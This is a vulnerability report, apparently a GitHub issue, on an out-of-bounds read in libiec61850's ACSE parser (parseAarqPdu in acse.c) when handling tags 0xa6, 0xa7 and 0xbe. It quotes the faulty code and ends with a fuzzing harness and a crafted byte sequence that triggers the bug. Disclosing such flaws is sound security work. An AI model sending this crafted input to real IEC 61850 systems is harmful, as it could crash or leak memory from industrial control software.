@@ -1,0 +1,64 @@
+issue #512
+
+Summary
+An Out-of-Bound Read vulnerability was discovered in the parseAarqPdu function of the acse.c file in the libiec61850 library through fuzzing. This vulnerability is triggered when parsing the 0xa6, 0xa7, 0xbe tags.
+
+Details
+The vulnerability occurs in the parseAarqPdu function when processing the 0xa6, 0xa7, 0xbe tags. When bufPos index used to read from the input buffer is not properly validated, leading to an out-of-bounds read.
+
+Let's consider when the execution reaches the following code:
+
+libiec61850/src/mms/iso_acse/acse.c
+
+Lines 266 to 270 in 790e3e6
+
+ while (bufPos < maxBufPos) { 
+     uint8_t tag = buffer[bufPos++]; 
+     int len; 
+  
+     bufPos = BerDecoder_decodeLength(buffer, &len, bufPos, maxBufPos); 
+If the end of the file contains bytes like a7 00, the tag variable will be set to 0xa7, and bufPos will point to the end of the file + 1. Due to the lack of proper boundary checks after this point, an out-of-bound read vulnerability can occur.
+For example, when processing the 0xa7 tag:
+
+libiec61850/src/mms/iso_acse/acse.c
+
+Lines 304 to 306 in 790e3e6
+
+ case 0xa7: /* calling AE qualifier */ 
+     { 
+         if (buffer[bufPos] == 0x02) { /* ae-qualifier-form2 */ 
+The same occurs when parsing the 0xa6, 0xbe tags here:
+
+libiec61850/src/mms/iso_acse/acse.c
+
+Lines 291 to 293 in 790e3e6
+
+ case 0xa6: /* calling AP title */ 
+     { 
+         if (buffer[bufPos] == 0x06) { /* ap-title-form2 */ 
+
+libiec61850/src/mms/iso_acse/acse.c
+
+Lines 342 to 343 in 790e3e6
+
+ case 0xbe: /* user information */ 
+     if (buffer[bufPos] != 0x28) { 
+
+PoC
+A proof-of-concept exploit has been provided in the attached file. This PoC demonstrates how the vulnerability can be triggered by sending specially crafted input data to the affected functions.
+
+#include "acse.h"
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
+{
+    AcseConnection acseConnection;
+    AcseConnection_init(&acseConnection, NULL, NULL, NULL);
+
+    ByteBuffer* acseBuffer = ByteBuffer_create(NULL, size);
+    ByteBuffer_append(acseBuffer, data, size);
+    AcseConnection_parseMessage(&acseConnection, acseBuffer);
+    
+    ByteBuffer_destroy(acseBuffer);
+    return 0;
+}
+<60><02><30><02><30><30><30><02><30><30><30><00><30><00><30><02><30><30><30><00><30><02><30><30><a7><00>
